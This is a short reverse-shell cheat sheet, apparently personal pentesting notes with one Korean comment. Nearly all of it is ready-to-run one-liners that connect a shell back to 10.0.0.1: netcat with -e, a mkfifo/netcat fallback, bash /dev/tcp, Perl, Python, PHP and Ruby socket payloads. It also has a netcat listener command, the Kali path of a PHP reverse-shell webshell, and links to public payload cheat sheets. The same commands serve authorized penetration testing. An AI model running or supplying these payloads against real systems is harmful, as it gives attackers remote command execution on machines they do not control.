reverse-shell
#
`Netcat`
```
rlwrap nc -nvlp <port>
```
```
nc -e /bin/sh 10.0.0.1 1234
```
잘못된 버전을 사용할 경우 다음과 같이 리버스 셸을 다시 사용할 수 있다
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
#
`Bash`
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
#
`Perl`
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
#
`python`
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
#
`php`
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
#
`ruby`
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
#
locate
```
/usr/share/webshells/php/php-reverse-shell.php
```

#
reference

- [reverse shell php](https://github.com/BlackArch/webshells)
- [reverse shell payload](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [reverse shell payload](https://highon.coffee/blog/reverse-shell-cheat-sheet/)